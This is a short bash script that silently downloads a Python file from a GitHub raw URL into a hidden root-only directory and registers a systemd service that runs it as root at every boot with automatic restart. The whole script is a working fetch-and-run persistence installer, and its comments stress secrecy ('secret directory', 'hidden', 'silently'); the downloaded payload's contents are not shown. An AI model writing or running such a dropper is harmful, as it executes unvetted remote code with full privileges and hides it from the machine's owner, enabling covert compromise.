#!/bin/bash
# -----------------------------
# Auto-run Python script in background at startup
# -----------------------------

# -----------------------------
# Configuration
# -----------------------------
PYTHON_FILE_URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
SECRET_DIR="/root/.system_service"   # Hidden & root-only directory
DEST_FILE="$SECRET_DIR/gd.py"
SERVICE_FILE="/etc/systemd/system/python_auto.service"
PYTHON_PATH="$(which python3)"       # Detect system Python3 path automatically

# -----------------------------
# Ensure secret directory exists
# -----------------------------
if [ ! -d "$SECRET_DIR" ]; then
    mkdir -p "$SECRET_DIR"
    chmod 700 "$SECRET_DIR"  # Only root can access
fi

# -----------------------------
# Download Python script silently
# -----------------------------
curl -s -o "$DEST_FILE" "$PYTHON_FILE_URL"
chmod 700 "$DEST_FILE"  # Make it executable only by root

# -----------------------------
# Create systemd service to auto-run the script
# -----------------------------
cat <<EOL > "$SERVICE_FILE"
[Unit]
Description=Auto-run secret Python script
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_PATH $DEST_FILE
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOL

# -----------------------------
# Reload systemd, enable and start service
# -----------------------------
systemctl daemon-reload
systemctl enable python_auto.service
systemctl start python_auto.service

echo "Setup complete. The Python script will auto-run on startup."
